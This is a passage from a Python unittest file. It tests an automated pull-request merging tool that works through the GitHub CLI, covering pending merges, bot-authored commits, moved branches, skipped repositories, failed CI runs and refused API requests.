        self.assertEqual(self.merged(), [])
        self.assertIn("pending", self.said[0])

    def test_what_changed_while_it_waited_is_judged_again(self) -> None:
        self.api.later = [{"commits": [commit(), commit("x", author={"login": "app[bot]"})]}]
        self.land()
        self.assertEqual(self.merged(), [])
        self.assertIn("is app[bot]'s", self.said[0])

    def test_a_branch_that_moves_after_its_run_is_left(self) -> None:
        lander = self.lander()
        with mock.patch.object(lander, "fresh", return_value=("f" * 40, "green")):
            self.assertFalse(lander.land(SLUG, self.api.pull))
        self.assertEqual(self.api.puts, [])
        self.assertIn("moved meanwhile", self.said[0])

    def test_the_kit_the_held_and_the_leaving_are_never_walked(self) -> None:
        declared = ecosystem.load()
        self.land(
            only=[r.slug for r in declared.repositories if r.hold or r.folds_into] + [declared.kit]
        )
        self.assertEqual(self.api.gets, ["user"])
        self.assertEqual(self.api.puts, [])
        said = "\n".join(self.said)
        self.assertIn(f"skipped: {declared.kit}: the kit's releases are made by hand", said)
        self.assertIn("skipped: jmrplens/kleidos: on hold", said)
        self.assertIn("skipped: kleidos-dev/social: it moves into kleidos-dev/brand", said)

    def test_what_it_says_it_merged(self) -> None:
        for change, merge, landed in (
            ({}, True, True),
            ({}, False, False),
            ({"files": [changed("src/x.py")]}, True, False),
            ({"runs": [{**self.api.runs[0], "conclusion": "failure"}]}, True, False),
        ):
            self.api = FakeApi()
            for name, value in change.items():
                setattr(self.api, name, value)
            self.assertIs(self.lander(merge).land(SLUG, self.api.pull), landed, change)

    def test_a_refused_request_stops_that_repository(self) -> None:
        self.api.refuse = "/pulls?"
        self.assertEqual(self.land(), 1)
        self.assertEqual(self.said, [f"stopped: {SLUG}: refused"])


class ApiTest(unittest.TestCase):
    def call(self, done: subprocess.CompletedProcess[str]) -> tuple[Any, list[str]]:
        with mock.patch.object(subprocess, "run", return_value=done) as run:
            return landing.Api().put("repos/x", {"a": "b"}), list(run.call_args.args[0])

    def test_gh_is_called_with_the_method_and_the_fields(self) -> None:
        answer, cmd = self.call(subprocess.CompletedProcess([], 0, json.dumps({"x": 1}), ""))
        self.assertEqual(answer, {"x": 1})
        self.assertEqual(cmd, ["gh", "api", "--method", "PUT", "repos/x", "-f", "a=b"])
        self.assertEqual(self.call(subprocess.CompletedProcess([], 0, " ", ""))[0], {})
        done = subprocess.CompletedProcess([], 0, "[]", "")
        with mock.patch.object(subprocess, "run", return_value=done) as run:
            self.assertEqual(landing.Api().get("repos/x"), [])
        self.assertEqual(run.call_args.args[0], ["gh", "api", "--method", "GET", "repos/x"])
        flags = {"capture_output": True, "text": True, "check": False}
        self.assertEqual(run.call_args.kwargs, flags)

    def test_a_refusal_is_an_error(self) -> None:
        with self.assertRaisesRegex(landing.ApiError, "PUT repos/x: no"):
            self.call(subprocess.CompletedProcess([], 1, "", "no\n"))


if __name__ == "__main__":
    unittest.main()
